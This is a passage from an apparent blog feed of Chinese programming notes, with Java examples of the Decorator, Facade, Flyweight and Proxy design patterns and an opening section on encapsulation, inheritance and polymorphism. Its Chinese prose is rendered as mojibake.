        <span>Beverage</span> beverage <span>=</span> <span>new</span> <span>HouseBlend</span><span>(</span><span>)</span><span>;</span>
        beverage <span>=</span> <span>new</span> <span>Mocha</span><span>(</span>beverage<span>)</span><span>;</span>
        beverage <span>=</span> <span>new</span> <span>Milk</span><span>(</span>beverage<span>)</span><span>;</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span>beverage<span>.</span><span>cost</span><span>(</span><span>)</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre></div><div><pre><code>3.0
</code></pre></div><h3 id="è®¾è®¡åŸåˆ™" tabindex="-1"> è®¾è®¡åŸåˆ™</h3>
<p>ç±»åº”è¯¥å¯¹æ‰©å±•å¼€æ”¾ï¼Œå¯¹ä¿®æ”¹å…³é—­ï¼šä¹Ÿå°±æ˜¯æ·»åŠ æ–°åŠŸèƒ½æ—¶ä¸éœ€è¦ä¿®æ”¹ä»£ç ã€‚é¥®æ–™å¯ä»¥åŠ¨æ€æ·»åŠ æ–°çš„é…æ–™ï¼Œè€Œä¸éœ€è¦å»ä¿®æ”¹é¥®æ–™çš„ä»£ç ã€‚</p>
<p>ä¸å¯èƒ½æŠŠæ‰€æœ‰çš„ç±»è®¾è®¡æˆéƒ½æ»¡è¶³è¿™ä¸€åŸåˆ™ï¼Œåº”å½“æŠŠè¯¥åŸåˆ™åº”ç”¨äºæœ€æœ‰å¯èƒ½å‘ç”Ÿæ”¹å˜çš„åœ°æ–¹ã€‚</p>
<h3 id="jdk-18" tabindex="-1"> JDK</h3>
<ul>
<li>java.io.BufferedInputStream(InputStream)</li>
<li>java.io.DataInputStream(InputStream)</li>
<li>java.io.BufferedOutputStream(OutputStream)</li>
<li>java.util.zip.ZipOutputStream(OutputStream)</li>
<li>java.util.Collections#checked<a href="">List|Map|Set|SortedSet|SortedMap</a></li>
</ul>
<h2 id="_5-å¤–è§‚-facade" tabindex="-1"> 5. å¤–è§‚ï¼ˆFacadeï¼‰</h2>
<h3 id="intent-22" tabindex="-1"> Intent</h3>
<p>æä¾›äº†ä¸€ä¸ªç»Ÿä¸€çš„æ¥å£ï¼Œç”¨æ¥è®¿é—®å­ç³»ç»Ÿä¸­çš„ä¸€ç¾¤æ¥å£ï¼Œä»è€Œè®©å­ç³»ç»Ÿæ›´å®¹æ˜“ä½¿ç”¨ã€‚</p>
<h3 id="class-diagram-22" tabindex="-1"> Class Diagram</h3>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/f9978fa6-9f49-4a0f-8540-02d269ac448f.png"/> </div><br>
<h3 id="implementation-22" tabindex="-1"> Implementation</h3>
<p>è§‚çœ‹ç”µå½±éœ€è¦æ“ä½œå¾ˆå¤šç”µå™¨ï¼Œä½¿ç”¨å¤–è§‚æ¨¡å¼å®ç°ä¸€é”®çœ‹ç”µå½±åŠŸèƒ½ã€‚</p>
<div><pre><code><span>public</span> <span>class</span> <span>SubSystem</span> <span>{</span>
    <span>public</span> <span>void</span> <span>turnOnTV</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"turnOnTV()"</span><span>)</span><span>;</span>
    <span>}</span>

    <span>public</span> <span>void</span> <span>setCD</span><span>(</span><span>String</span> cd<span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"setCD( "</span> <span>+</span> cd <span>+</span> <span>" )"</span><span>)</span><span>;</span>
    <span>}</span>

    <span>public</span> <span>void</span> <span>startWatching</span><span>(</span><span>)</span><span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"startWatching()"</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>Facade</span> <span>{</span>
    <span>private</span> <span>SubSystem</span> subSystem <span>=</span> <span>new</span> <span>SubSystem</span><span>(</span><span>)</span><span>;</span>

    <span>public</span> <span>void</span> <span>watchMovie</span><span>(</span><span>)</span> <span>{</span>
        subSystem<span>.</span><span>turnOnTV</span><span>(</span><span>)</span><span>;</span>
        subSystem<span>.</span><span>setCD</span><span>(</span><span>"a movie"</span><span>)</span><span>;</span>
        subSystem<span>.</span><span>startWatching</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>Client</span> <span>{</span>
    <span>public</span> <span>static</span> <span>void</span> <span>main</span><span>(</span><span>String</span><span>[</span><span>]</span> args<span>)</span> <span>{</span>
        <span>Facade</span> facade <span>=</span> <span>new</span> <span>Facade</span><span>(</span><span>)</span><span>;</span>
        facade<span>.</span><span>watchMovie</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre></div><h3 id="è®¾è®¡åŸåˆ™-1" tabindex="-1"> è®¾è®¡åŸåˆ™</h3>
<p>æœ€å°‘çŸ¥è¯†åŸåˆ™ï¼šåªå’Œä½ çš„å¯†å‹è°ˆè¯ã€‚ä¹Ÿå°±æ˜¯è¯´å®¢æˆ·å¯¹è±¡æ‰€éœ€è¦äº¤äº’çš„å¯¹è±¡åº”å½“å°½å¯èƒ½å°‘ã€‚</p>
<h2 id="_6-äº«å…ƒ-flyweight" tabindex="-1"> 6. äº«å…ƒï¼ˆFlyweightï¼‰</h2>
<h3 id="intent-23" tabindex="-1"> Intent</h3>
<p>åˆ©ç”¨å…±äº«çš„æ–¹å¼æ¥æ”¯æŒå¤§é‡ç»†ç²’åº¦çš„å¯¹è±¡ï¼Œè¿™äº›å¯¹è±¡ä¸€éƒ¨åˆ†å†…éƒ¨çŠ¶æ€æ˜¯ç›¸åŒçš„ã€‚</p>
<h3 id="class-diagram-23" tabindex="-1"> Class Diagram</h3>
<ul>
<li>Flyweightï¼šäº«å…ƒå¯¹è±¡</li>
<li>IntrinsicStateï¼šå†…éƒ¨çŠ¶æ€ï¼Œäº«å…ƒå¯¹è±¡å…±äº«å†…éƒ¨çŠ¶æ€</li>
<li>ExtrinsicStateï¼šå¤–éƒ¨çŠ¶æ€ï¼Œæ¯ä¸ªäº«å…ƒå¯¹è±¡çš„å¤–éƒ¨çŠ¶æ€ä¸åŒ</li>
</ul>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/5f5c22d5-9c0e-49e1-b5b0-6cc7032724d4.png"/> </div><br>
<h3 id="implementation-23" tabindex="-1"> Implementation</h3>
<div><pre><code><span>public</span> <span>interface</span> <span>Flyweight</span> <span>{</span>
    <span>void</span> <span>doOperation</span><span>(</span><span>String</span> extrinsicState<span>)</span><span>;</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>ConcreteFlyweight</span> <span>implements</span> <span>Flyweight</span> <span>{</span>

    <span>private</span> <span>String</span> intrinsicState<span>;</span>

    <span>public</span> <span>ConcreteFlyweight</span><span>(</span><span>String</span> intrinsicState<span>)</span> <span>{</span>
        <span>this</span><span>.</span>intrinsicState <span>=</span> intrinsicState<span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>doOperation</span><span>(</span><span>String</span> extrinsicState<span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"Object address: "</span> <span>+</span> <span>System</span><span>.</span><span>identityHashCode</span><span>(</span><span>this</span><span>)</span><span>)</span><span>;</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"IntrinsicState: "</span> <span>+</span> intrinsicState<span>)</span><span>;</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"ExtrinsicState: "</span> <span>+</span> extrinsicState<span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>FlyweightFactory</span> <span>{</span>

    <span>private</span> <span>HashMap</span><span><span>&lt;</span><span>String</span><span>,</span> <span>Flyweight</span><span>></span></span> flyweights <span>=</span> <span>new</span> <span>HashMap</span><span><span>&lt;</span><span>></span></span><span>(</span><span>)</span><span>;</span>

    <span>Flyweight</span> <span>getFlyweight</span><span>(</span><span>String</span> intrinsicState<span>)</span> <span>{</span>
        <span>if</span> <span>(</span><span>!</span>flyweights<span>.</span><span>containsKey</span><span>(</span>intrinsicState<span>)</span><span>)</span> <span>{</span>
            <span>Flyweight</span> flyweight <span>=</span> <span>new</span> <span>ConcreteFlyweight</span><span>(</span>intrinsicState<span>)</span><span>;</span>
            flyweights<span>.</span><span>put</span><span>(</span>intrinsicState<span>,</span> flyweight<span>)</span><span>;</span>
        <span>}</span>
        <span>return</span> flyweights<span>.</span><span>get</span><span>(</span>intrinsicState<span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>Client</span> <span>{</span>

    <span>public</span> <span>static</span> <span>void</span> <span>main</span><span>(</span><span>String</span><span>[</span><span>]</span> args<span>)</span> <span>{</span>
        <span>FlyweightFactory</span> factory <span>=</span> <span>new</span> <span>FlyweightFactory</span><span>(</span><span>)</span><span>;</span>
        <span>Flyweight</span> flyweight1 <span>=</span> factory<span>.</span><span>getFlyweight</span><span>(</span><span>"aa"</span><span>)</span><span>;</span>
        <span>Flyweight</span> flyweight2 <span>=</span> factory<span>.</span><span>getFlyweight</span><span>(</span><span>"aa"</span><span>)</span><span>;</span>
        flyweight1<span>.</span><span>doOperation</span><span>(</span><span>"x"</span><span>)</span><span>;</span>
        flyweight2<span>.</span><span>doOperation</span><span>(</span><span>"y"</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br></div></div><div><pre><code>Object address: 1163157884
IntrinsicState: aa
ExtrinsicState: x
Object address: 1163157884
IntrinsicState: aa
ExtrinsicState: y
</code></pre></div><h3 id="jdk-19" tabindex="-1"> JDK</h3>
<p>Java åˆ©ç”¨ç¼“å­˜æ¥åŠ é€Ÿå¤§é‡å°å¯¹è±¡çš„è®¿é—®æ—¶é—´ã€‚</p>
<ul>
<li>java.lang.Integer#valueOf(int)</li>
<li>java.lang.Boolean#valueOf(boolean)</li>
<li>java.lang.Byte#valueOf(byte)</li>
<li>java.lang.Character#valueOf(char)</li>
</ul>
<h2 id="_7-ä»£ç†-proxy" tabindex="-1"> 7. ä»£ç†ï¼ˆProxyï¼‰</h2>
<h3 id="intent-24" tabindex="-1"> Intent</h3>
<p>æ§åˆ¶å¯¹å…¶å®ƒå¯¹è±¡çš„è®¿é—®ã€‚</p>
<h3 id="class-diagram-24" tabindex="-1"> Class Diagram</h3>
<p>ä»£ç†æœ‰ä»¥ä¸‹å››ç±»ï¼š</p>
<ul>
<li>è¿œç¨‹ä»£ç†ï¼ˆRemote Proxyï¼‰ï¼šæ§åˆ¶å¯¹è¿œç¨‹å¯¹è±¡ï¼ˆä¸åŒåœ°å€ç©ºé—´ï¼‰çš„è®¿é—®ï¼Œå®ƒè´Ÿè´£å°†è¯·æ±‚åŠå…¶å‚æ•°è¿›è¡Œç¼–ç ï¼Œå¹¶å‘ä¸åŒåœ°å€ç©ºé—´ä¸­çš„å¯¹è±¡å‘é€å·²ç»ç¼–ç çš„è¯·æ±‚ã€‚</li>
<li>è™šæ‹Ÿä»£ç†ï¼ˆVirtual Proxyï¼‰ï¼šæ ¹æ®éœ€è¦åˆ›å»ºå¼€é”€å¾ˆå¤§çš„å¯¹è±¡ï¼Œå®ƒå¯ä»¥ç¼“å­˜å®ä½“çš„é™„åŠ ä¿¡æ¯ï¼Œä»¥ä¾¿å»¶è¿Ÿå¯¹å®ƒçš„è®¿é—®ï¼Œä¾‹å¦‚åœ¨ç½‘ç«™åŠ è½½ä¸€ä¸ªå¾ˆå¤§å›¾ç‰‡æ—¶ï¼Œä¸èƒ½é©¬ä¸Šå®Œæˆï¼Œå¯ä»¥ç”¨è™šæ‹Ÿä»£ç†ç¼“å­˜å›¾ç‰‡çš„å¤§å°ä¿¡æ¯ï¼Œç„¶åç”Ÿæˆä¸€å¼ ä¸´æ—¶å›¾ç‰‡ä»£æ›¿åŸå§‹å›¾ç‰‡ã€‚</li>
<li>ä¿æŠ¤ä»£ç†ï¼ˆProtection Proxyï¼‰ï¼šæŒ‰æƒé™æ§åˆ¶å¯¹è±¡çš„è®¿é—®ï¼Œå®ƒè´Ÿè´£æ£€æŸ¥è°ƒç”¨è€…æ˜¯å¦å…·æœ‰å®ç°ä¸€ä¸ªè¯·æ±‚æ‰€å¿…é¡»çš„è®¿é—®æƒé™ã€‚</li>
<li>æ™ºèƒ½ä»£ç†ï¼ˆSmart Referenceï¼‰ï¼šå–ä»£äº†ç®€å•çš„æŒ‡é’ˆï¼Œå®ƒåœ¨è®¿é—®å¯¹è±¡æ—¶æ‰§è¡Œä¸€äº›é™„åŠ æ“ä½œï¼šè®°å½•å¯¹è±¡çš„å¼•ç”¨æ¬¡æ•°ï¼›å½“ç¬¬ä¸€æ¬¡å¼•ç”¨ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œå°†å®ƒè£…å…¥å†…å­˜ï¼›åœ¨è®¿é—®ä¸€ä¸ªå®é™…å¯¹è±¡å‰ï¼Œæ£€æŸ¥æ˜¯å¦å·²ç»é”å®šäº†å®ƒï¼Œä»¥ç¡®ä¿å…¶å®ƒå¯¹è±¡ä¸èƒ½æ”¹å˜å®ƒã€‚</li>
</ul>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/9b679ff5-94c6-48a7-b9b7-2ea868e828ed.png"/> </div><br>
<h3 id="implementation-24" tabindex="-1"> Implementation</h3>
<p>ä»¥ä¸‹æ˜¯ä¸€ä¸ªè™šæ‹Ÿä»£ç†çš„å®ç°ï¼Œæ¨¡æ‹Ÿäº†å›¾ç‰‡å»¶è¿ŸåŠ è½½çš„æƒ…å†µä¸‹ä½¿ç”¨ä¸å›¾ç‰‡å¤§å°ç›¸ç­‰çš„ä¸´æ—¶å†…å®¹å»æ›¿æ¢åŸå§‹å›¾ç‰‡ï¼Œç›´åˆ°å›¾ç‰‡åŠ è½½å®Œæˆæ‰å°†å›¾ç‰‡æ˜¾ç¤ºå‡ºæ¥ã€‚</p>
<div><pre><code><span>public</span> <span>interface</span> <span>Image</span> <span>{</span>
    <span>void</span> <span>showImage</span><span>(</span><span>)</span><span>;</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>HighResolutionImage</span> <span>implements</span> <span>Image</span> <span>{</span>

    <span>private</span> <span>URL</span> imageURL<span>;</span>
    <span>private</span> <span>long</span> startTime<span>;</span>
    <span>private</span> <span>int</span> height<span>;</span>
    <span>private</span> <span>int</span> width<span>;</span>

    <span>public</span> <span>int</span> <span>getHeight</span><span>(</span><span>)</span> <span>{</span>
        <span>return</span> height<span>;</span>
    <span>}</span>

    <span>public</span> <span>int</span> <span>getWidth</span><span>(</span><span>)</span> <span>{</span>
        <span>return</span> width<span>;</span>
    <span>}</span>

    <span>public</span> <span>HighResolutionImage</span><span>(</span><span>URL</span> imageURL<span>)</span> <span>{</span>
        <span>this</span><span>.</span>imageURL <span>=</span> imageURL<span>;</span>
        <span>this</span><span>.</span>startTime <span>=</span> <span>System</span><span>.</span><span>currentTimeMillis</span><span>(</span><span>)</span><span>;</span>
        <span>this</span><span>.</span>width <span>=</span> <span>600</span><span>;</span>
        <span>this</span><span>.</span>height <span>=</span> <span>600</span><span>;</span>
    <span>}</span>

    <span>public</span> <span>boolean</span> <span>isLoad</span><span>(</span><span>)</span> <span>{</span>
        <span>// æ¨¡æ‹Ÿå›¾ç‰‡åŠ è½½ï¼Œå»¶è¿Ÿ 3s åŠ è½½å®Œæˆ</span>
        <span>long</span> endTime <span>=</span> <span>System</span><span>.</span><span>currentTimeMillis</span><span>(</span><span>)</span><span>;</span>
        <span>return</span> endTime <span>-</span> startTime <span>></span> <span>3000</span><span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>showImage</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"Real Image: "</span> <span>+</span> imageURL<span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>ImageProxy</span> <span>implements</span> <span>Image</span> <span>{</span>

    <span>private</span> <span>HighResolutionImage</span> highResolutionImage<span>;</span>

    <span>public</span> <span>ImageProxy</span><span>(</span><span>HighResolutionImage</span> highResolutionImage<span>)</span> <span>{</span>
        <span>this</span><span>.</span>highResolutionImage <span>=</span> highResolutionImage<span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>showImage</span><span>(</span><span>)</span> <span>{</span>
        <span>while</span> <span>(</span><span>!</span>highResolutionImage<span>.</span><span>isLoad</span><span>(</span><span>)</span><span>)</span> <span>{</span>
            <span>try</span> <span>{</span>
                <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"Temp Image: "</span> <span>+</span> highResolutionImage<span>.</span><span>getWidth</span><span>(</span><span>)</span> <span>+</span> <span>" "</span> <span>+</span> highResolutionImage<span>.</span><span>getHeight</span><span>(</span><span>)</span><span>)</span><span>;</span>
                <span>Thread</span><span>.</span><span>sleep</span><span>(</span><span>100</span><span>)</span><span>;</span>
            <span>}</span> <span>catch</span> <span>(</span><span>InterruptedException</span> e<span>)</span> <span>{</span>
                e<span>.</span><span>printStackTrace</span><span>(</span><span>)</span><span>;</span>
            <span>}</span>
        <span>}</span>
        highResolutionImage<span>.</span><span>showImage</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>ImageViewer</span> <span>{</span>

    <span>public</span> <span>static</span> <span>void</span> <span>main</span><span>(</span><span>String</span><span>[</span><span>]</span> args<span>)</span> <span>throws</span> <span>Exception</span> <span>{</span>
        <span>String</span> image <span>=</span> <span>"http://image.jpg"</span><span>;</span>
        <span>URL</span> url <span>=</span> <span>new</span> <span>URL</span><span>(</span>image<span>)</span><span>;</span>
        <span>HighResolutionImage</span> highResolutionImage <span>=</span> <span>new</span> <span>HighResolutionImage</span><span>(</span>url<span>)</span><span>;</span>
        <span>ImageProxy</span> imageProxy <span>=</span> <span>new</span> <span>ImageProxy</span><span>(</span>highResolutionImage<span>)</span><span>;</span>
        imageProxy<span>.</span><span>showImage</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br></div></div><h3 id="jdk-20" tabindex="-1"> JDK</h3>
<ul>
<li>java.lang.reflect.Proxy</li>
<li>RMI</li>
</ul>
<h1 id="å‚è€ƒèµ„æ–™" tabindex="-1"> å‚è€ƒèµ„æ–™</h1>
<ul>
<li>å¼—é‡Œæ›¼. Head First è®¾è®¡æ¨¡å¼ [M]. ä¸­å›½ç”µåŠ›å‡ºç‰ˆç¤¾, 2007.</li>
<li>Gamma E. è®¾è®¡æ¨¡å¼: å¯å¤ç”¨é¢å‘å¯¹è±¡è½¯ä»¶çš„åŸºç¡€ [M]. æœºæ¢°å·¥ä¸šå‡ºç‰ˆç¤¾, 2007.</li>
<li>Bloch J. Effective java[M]. Addison-Wesley Professional, 2017.</li>
<li><a href="http://www.oodesign.com/" target="_blank" rel="noopener noreferrer">Design Patterns</a></li>
<li><a href="http://java-design-patterns.com/" target="_blank" rel="noopener noreferrer">Design patterns implemented in Java</a></li>
<li><a href="http://www.programering.com/a/MTNxAzMwATY.html" target="_blank" rel="noopener noreferrer">The breakdown of design patterns in JDK</a></li>
</ul>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">ä¸€ã€ä¸‰å¤§ç‰¹æ€§</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/OOP/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E6%80%9D%E6%83%B3.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/OOP/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E6%80%9D%E6%83%B3.html"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <content type="html"><![CDATA[
<ul>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
</ul>
</li>
<li></li>
</ul>

<h1 id="ä¸€ã€ä¸‰å¤§ç‰¹æ€§" tabindex="-1"> ä¸€ã€ä¸‰å¤§ç‰¹æ€§</h1>
<h2 id="å°è£…" tabindex="-1"> å°è£…</h2>
<p>åˆ©ç”¨æŠ½è±¡æ•°æ®ç±»å‹å°†æ•°æ®å’ŒåŸºäºæ•°æ®çš„æ“ä½œå°è£…åœ¨ä¸€èµ·ï¼Œä½¿å…¶æ„æˆä¸€ä¸ªä¸å¯åˆ†å‰²çš„ç‹¬ç«‹å®ä½“ã€‚æ•°æ®è¢«ä¿æŠ¤åœ¨æŠ½è±¡æ•°æ®ç±»å‹çš„å†…éƒ¨ï¼Œå°½å¯èƒ½åœ°éšè—å†…éƒ¨çš„ç»†èŠ‚ï¼Œåªä¿ç•™ä¸€äº›å¯¹å¤–çš„æ¥å£ä½¿å…¶ä¸å¤–éƒ¨å‘ç”Ÿè”ç³»ã€‚ç”¨æˆ·æ— éœ€å…³å¿ƒå¯¹è±¡å†…éƒ¨çš„ç»†èŠ‚ï¼Œä½†å¯ä»¥é€šè¿‡å¯¹è±¡å¯¹å¤–æä¾›çš„æ¥å£æ¥è®¿é—®è¯¥å¯¹è±¡ã€‚</p>
<p>ä¼˜ç‚¹ï¼š</p>
<ul>
<li>å‡å°‘è€¦åˆï¼šå¯ä»¥ç‹¬ç«‹åœ°å¼€å‘ã€æµ‹è¯•ã€ä¼˜åŒ–ã€ä½¿ç”¨ã€ç†è§£å’Œä¿®æ”¹</li>
<li>å‡è½»ç»´æŠ¤çš„è´Ÿæ‹…ï¼šå¯ä»¥æ›´å®¹æ˜“è¢«ç¨‹åºå‘˜ç†è§£ï¼Œå¹¶ä¸”åœ¨è°ƒè¯•çš„æ—¶å€™å¯ä»¥ä¸å½±å“å…¶ä»–æ¨¡å—</li>
<li>æœ‰æ•ˆåœ°è°ƒèŠ‚æ€§èƒ½ï¼šå¯ä»¥é€šè¿‡å‰–ææ¥ç¡®å®šå“ªäº›æ¨¡å—å½±å“äº†ç³»ç»Ÿçš„æ€§èƒ½</li>
<li>æé«˜è½¯ä»¶çš„å¯é‡ç”¨æ€§</li>
<li>é™ä½äº†æ„å»ºå¤§å‹ç³»ç»Ÿçš„é£é™©ï¼šå³ä½¿æ•´ä¸ªç³»ç»Ÿä¸å¯ç”¨ï¼Œä½†æ˜¯è¿™äº›ç‹¬ç«‹çš„æ¨¡å—å´æœ‰å¯èƒ½æ˜¯å¯ç”¨çš„</li>
</ul>
<p>ä»¥ä¸‹ Person ç±»å°è£… nameã€genderã€age ç­‰å±æ€§ï¼Œå¤–ç•Œåªèƒ½é€šè¿‡ get() æ–¹æ³•è·å–ä¸€ä¸ª Person å¯¹è±¡çš„ name å±æ€§å’Œ gender å±æ€§ï¼Œè€Œæ— æ³•è·å– age å±æ€§ï¼Œä½†æ˜¯ age å±æ€§å¯ä»¥ä¾› work() æ–¹æ³•ä½¿ç”¨ã€‚</p>
<p>æ³¨æ„åˆ° gender å±æ€§ä½¿ç”¨ int æ•°æ®ç±»å‹è¿›è¡Œå­˜å‚¨ï¼Œå°è£…ä½¿å¾—ç”¨æˆ·æ³¨æ„ä¸åˆ°è¿™ç§å®ç°ç»†èŠ‚ã€‚å¹¶ä¸”åœ¨éœ€è¦ä¿®æ”¹ gender å±æ€§ä½¿ç”¨çš„æ•°æ®ç±»å‹æ—¶ï¼Œä¹Ÿå¯ä»¥åœ¨ä¸å½±å“å®¢æˆ·ç«¯ä»£ç çš„æƒ…å†µä¸‹è¿›è¡Œã€‚</p>
<div><pre><code><span>public</span> <span>class</span> <span>Person</span> <span>{</span>

    <span>private</span> <span>String</span> name<span>;</span>
    <span>private</span> <span>int</span> gender<span>;</span>
    <span>private</span> <span>int</span> age<span>;</span>

    <span>public</span> <span>String</span> <span>getName</span><span>(</span><span>)</span> <span>{</span>
        <span>return</span> name<span>;</span>
    <span>}</span>

    <span>public</span> <span>String</span> <span>getGender</span><span>(</span><span>)</span> <span>{</span>
        <span>return</span> gender <span>==</span> <span>0</span> <span>?</span> <span>"man"</span> <span>:</span> <span>"woman"</span><span>;</span>
    <span>}</span>

    <span>public</span> <span>void</span> <span>work</span><span>(</span><span>)</span> <span>{</span>
        <span>if</span> <span>(</span><span>18</span> <span>&lt;=</span> age <span>&amp;&amp;</span> age <span>&lt;=</span> <span>50</span><span>)</span> <span>{</span>
            <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span>name <span>+</span> <span>" is working very hard!"</span><span>)</span><span>;</span>
        <span>}</span> <span>else</span> <span>{</span>
            <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span>name <span>+</span> <span>" can't work any more!"</span><span>)</span><span>;</span>
        <span>}</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br></div></div><h2 id="ç»§æ‰¿" tabindex="-1"> ç»§æ‰¿</h2>
<p>ç»§æ‰¿å®ç°äº†  <strong>IS-A</strong>  å…³ç³»ï¼Œä¾‹å¦‚ Cat å’Œ Animal å°±æ˜¯ä¸€ç§ IS-A å…³ç³»ï¼Œå› æ­¤ Cat å¯ä»¥ç»§æ‰¿è‡ª Animalï¼Œä»è€Œè·å¾— Animal é private çš„å±æ€§å’Œæ–¹æ³•ã€‚</p>
<p>ç»§æ‰¿åº”è¯¥éµå¾ªé‡Œæ°æ›¿æ¢åŸåˆ™ï¼Œå­ç±»å¯¹è±¡å¿…é¡»èƒ½å¤Ÿæ›¿æ¢æ‰æ‰€æœ‰çˆ¶ç±»å¯¹è±¡ã€‚</p>
<p>Cat å¯ä»¥å½“åš Animal æ¥ä½¿ç”¨ï¼Œä¹Ÿå°±æ˜¯è¯´å¯ä»¥ä½¿ç”¨ Animal å¼•ç”¨ Cat å¯¹è±¡ã€‚çˆ¶ç±»å¼•ç”¨æŒ‡å‘å­ç±»å¯¹è±¡ç§°ä¸º  <strong>å‘ä¸Šè½¬å‹</strong> ã€‚</p>
<div><pre><code><span>Animal</span> animal <span>=</span> <span>new</span> <span>Cat</span><span>(</span><span>)</span><span>;</span>
</code></pre></div><h2 id="å¤šæ€" tabindex="-1"> å¤šæ€</h2>
<p>å¤šæ€åˆ†ä¸ºç¼–è¯‘æ—¶å¤šæ€å’Œè¿è¡Œæ—¶å¤šæ€ï¼š</p>
<ul>
<li>ç¼–è¯‘æ—¶å¤šæ€ä¸»è¦æŒ‡æ–¹æ³•çš„é‡è½½</li>
<li>è¿è¡Œæ—¶å¤šæ€æŒ‡ç¨‹åºä¸­å®šä¹‰çš„å¯¹è±¡å¼•ç”¨æ‰€æŒ‡å‘çš„å…·ä½“ç±»å‹åœ¨è¿è¡ŒæœŸé—´æ‰ç¡®å®š</li>
</ul>
